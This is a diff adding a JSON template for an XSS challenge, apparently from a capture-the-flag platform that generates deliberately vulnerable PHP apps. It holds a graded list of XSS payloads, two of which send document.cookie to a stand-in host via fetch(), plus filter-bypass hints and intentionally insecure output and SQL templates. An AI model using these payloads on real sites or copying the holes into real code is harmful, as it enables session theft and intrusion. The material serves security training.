@@ -1,0 +1,296 @@
+{
+  "vulnerability_id": "xss_001",
+  "name": "xss",
+  "category": "cross_site_scripting",
+  "difficulty_range": [1, 5],
+  "description": "Cross-Site Scripting vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. This can lead to session hijacking, credential theft, and defacement.",
+
+  "infrastructure": {
+    "needs_database": true,
+    "database_type": "mysql",
+    "needs_file_system": false,
+    "needs_external_service": false,
+    "docker_requirements": {
+      "base_image": "php:8.0-apache",
+      "extensions": ["mysqli", "pdo", "pdo_mysql"],
+      "packages": ["curl", "vim", "net-tools"]
+    }
+  },
+
+  "database_schema": {
+    "tables": [
+      {
+        "name": "comments",
+        "columns": [
+          "id INT AUTO_INCREMENT PRIMARY KEY",
+          "username VARCHAR(100)",
+          "comment TEXT",
+          "created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP"
+        ]
+      },
+      {
+        "name": "posts",
+        "columns": [
+          "id INT AUTO_INCREMENT PRIMARY KEY",
+          "title VARCHAR(255)",
+          "content TEXT",
+          "author VARCHAR(100)",
+          "created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP"
+        ]
+      },
+      {
+        "name": "users",
+        "columns": [
+          "id INT AUTO_INCREMENT PRIMARY KEY",
+          "username VARCHAR(100) UNIQUE",
+          "email VARCHAR(255)",
+          "session_token VARCHAR(255)",
+          "secret_data TEXT"
+        ]
+      }
+    ],
+    "seed_data": {
+      "comments": [
+        {
+          "username": "admin",
+          "comment": "Welcome to our platform!",
+          "created_at": "NOW()"
+        },
+        {
+          "username": "user1",
+          "comment": "Great website!",
+          "created_at": "NOW()"
+        }
+      ],
+      "posts": [
+        {
+          "title": "Welcome Post",
+          "content": "This is the first post on our platform.",
+          "author": "admin",
+          "created_at": "NOW()"
+        }
+      ],
+      "users": [
+        {
+          "username": "admin",
+          "email": "admin@hackforge.local",
+          "session_token": "admin_secret_token_12345",
+          "secret_data": "{{FLAG}}"
+        },
+        {
+          "username": "user1",
+          "email": "user1@hackforge.local",
+          "session_token": "user_token_67890",
+          "secret_data": "Regular user data"
+        }
+      ]
+    },
+    "flag_location": "users.secret_data WHERE username='admin'"
+  },
+
+  "variants": [
+    {
+      "name": "Reflected XSS",
+      "description": "User input is immediately reflected back in the response without proper sanitization",
+      "exploit_example": "<script>alert(document.cookie)</script>",
+      "output_type": "direct_output",
+      "difficulty_multiplier": 1.0
+    },
+    {
+      "name": "Stored XSS",
+      "description": "Malicious script is stored in database and executed when viewed by other users",
+      "exploit_example": "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
+      "output_type": "database_stored",
+      "difficulty_multiplier": 1.3
+    },
+    {
+      "name": "DOM-based XSS",
+      "description": "Client-side JavaScript code processes user input unsafely, creating XSS vulnerability",
+      "exploit_example": "#<img src=x onerror=alert(1)>",
+      "output_type": "client_side",
+      "difficulty_multiplier": 1.5
+    },
+    {
+      "name": "Attribute-based XSS",
+      "description": "User input is placed inside HTML attributes without proper encoding",
+      "exploit_example": "\" onload=\"alert(document.cookie)",
+      "output_type": "attribute_injection",
+      "difficulty_multiplier": 1.2
+    }
+  ],
+
+  "entry_points": [
+    {
+      "type": "search_query",
+      "description": "Search functionality that reflects user input",
+      "parameter": "q"
+    },
+    {
+      "type": "comment_form",
+      "description": "Comment submission form",
+      "parameter": "comment"
+    },
+    {
+      "type": "profile_field",
+      "description": "User profile fields (name, bio, etc.)",
+      "parameter": "bio"
+    },
+    {
+      "type": "url_parameter",
+      "description": "URL parameters displayed on page",
+      "parameter": "message"
+    }
+  ],
+
+  "mutation_axes": {
+    "contexts": [
+      {
+        "name": "comment_system",
+        "description": "User comments that are displayed to other users",
+        "query_template": "INSERT INTO comments (username, comment) VALUES ('$username', '$comment')",
+        "output_template": "echo '<div class=\"comment\">' . $comment . '</div>';"
+      },
+      {
+        "name": "search_results",
+        "description": "Search functionality that displays results",
+        "query_template": "SELECT * FROM posts WHERE title LIKE '%$search%'",
+        "output_template": "echo 'Search results for: ' . $search;"
+      },
+      {
+        "name": "user_profile",
+        "description": "User profile page displaying user information",
+        "query_template": "UPDATE users SET bio='$bio' WHERE username='$user'",
+        "output_template": "echo '<p>Bio: ' . $bio . '</p>';"
+      },
+      {
+        "name": "message_board",
+        "description": "Public message board",
+        "query_template": "INSERT INTO messages (author, content) VALUES ('$author', '$content')",
+        "output_template": "echo '<div class=\"message\">' . $content . '</div>';"
+      }
+    ],
+
+    "filters": {
+      "basic": [
+        {
+          "name": "script_tag_filter",
+          "type": "script_tag",
+          "description": "Blocks <script> tags (case-sensitive)",
+          "php_code": "$input = str_replace('<script>', '', $input); $input = str_replace('</script>', '', $input);",
+          "python_code": "input_data = input_data.replace('<script>', '').replace('</script>', '')",
+          "bypass_hint": "Use mixed case like <ScRiPt> or alternative tags like <img>"
+        },
+        {
+          "name": "angle_bracket_filter",
+          "type": "character_filter",
+          "description": "Removes < and > characters",
+          "php_code": "$input = str_replace(['<', '>'], '', $input);",
+          "python_code": "input_data = input_data.replace('<', '').replace('>', '')",
+          "bypass_hint": "Use URL encoding or alternative injection points"
+        }
+      ],
+      "medium": [
+        {
+          "name": "htmlspecialchars_partial",
+          "type": "encoding",
+          "description": "Partial HTML entity encoding (missing ENT_QUOTES)",
+          "php_code": "$input = htmlspecialchars($input);",
+          "python_code": "import html; input_data = html.escape(input_data)",
+          "bypass_hint": "Single quotes are not encoded - inject in attributes with single quotes"
+        },
+        {
+          "name": "event_handler_filter",
+          "type": "event_filter",
+          "description": "Blocks common event handlers (onerror, onload, onclick)",
+          "php_code": "$input = preg_replace('/on\\w+\\s*=/i', '', $input);",
+          "python_code": "import re; input_data = re.sub(r'on\\w+\\s*=', '', input_data, flags=re.IGNORECASE)",
+          "bypass_hint": "Use less common event handlers like onanimationstart or onfocus"
+        },
+        {
+          "name": "javascript_protocol_filter",
+          "type": "protocol_filter",
+          "description": "Blocks javascript: protocol",
+          "php_code": "$input = str_replace('javascript:', '', $input);",
+          "python_code": "input_data = input_data.replace('javascript:', '')",
+          "bypass_hint": "Use data: protocol or encode the payload"
+        }
+      ],
+      "advanced": [
+        {
+          "name": "dom_purify_bypass",
+          "type": "sanitization",
+          "description": "Client-side sanitization with potential bypasses",
+          "php_code": "// Client-side sanitization only",
+          "python_code": "# Client-side sanitization only",
+          "bypass_hint": "Exploit parser differentials or mutation XSS techniques"
+        },
+        {
+          "name": "csp_bypass",
+          "type": "csp",
+          "description": "Content Security Policy with unsafe-inline",
+          "php_code": "header(\"Content-Security-Policy: script-src 'self' 'unsafe-inline'\");",
+          "python_code": "response.headers['Content-Security-Policy'] = \"script-src 'self' 'unsafe-inline'\"",
+          "bypass_hint": "CSP allows inline scripts - standard XSS payloads work"
+        },
+        {
+          "name": "regex_blacklist",
+          "type": "regex_filter",
+          "description": "Regex-based blacklist that can be bypassed",
+          "php_code": "$input = preg_replace('/<script.*?>.*?<\\/script>/is', '', $input);",
+          "python_code": "import re; input_data = re.sub(r'<script.*?>.*?</script>', '', input_data, flags=re.IGNORECASE|re.DOTALL)",
+          "bypass_hint": "Use unclosed tags or nested encoding"
+        }
+      ]
+    },
+
+    "payloads": [
+      {
+        "difficulty": 1,
+        "examples": [
+          "<script>alert(1)</script>",
+          "<img src=x onerror=alert(1)>",
+          "<svg onload=alert(1)>"
+        ]
+      },
+      {
+        "difficulty": 2,
+        "examples": [
+          "<ScRiPt>alert(1)</ScRiPt>",
+          "<img src=x onerror=alert(document.cookie)>",
+          "'-alert(1)-'"
+        ]
+      },
+      {
+        "difficulty": 3,
+        "examples": [
+          "<img src=x onerror=\"fetch('http://attacker.com?c='+document.cookie)\">",
+          "<svg><script>alert&#40;1)</script>",
+          "javascript:alert(document.cookie)"
+        ]
+      },
+      {
+        "difficulty": 4,
+        "examples": [
+          "<iframe src=\"javascript:alert(document.cookie)\">",
+          "<object data=\"data:text/html,<script>alert(1)</script>\">",
+          "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+        ]
+      },
+      {
+        "difficulty": 5,
+        "examples": [
+          "<math><mtext></mtext><mglyph><style><img src onerror=alert(1)>",
+          "<form action=\"javascript:alert(1)\"><button>Click</button></form>",
+          "<link rel=import href=data:text/html,<script>alert(1)</script>>"
+        ]
+      }
+    ]
+  },
+
+  "ai_generation_hints": {
+    "code_structure": "Generate vulnerable PHP code that takes user input and displays it without proper sanitization. Include both reflected and stored XSS scenarios.",
+    "vulnerability_placement": "Place user input directly in HTML output, HTML attributes, or JavaScript contexts without encoding.",
+    "database_connection": "$conn = mysqli_connect('db', 'hackforge', 'hackforge123', 'hackforge');",
+    "dockerfile_notes": "Include standard Apache/PHP setup. No special XSS-specific requirements."
+  }
+}
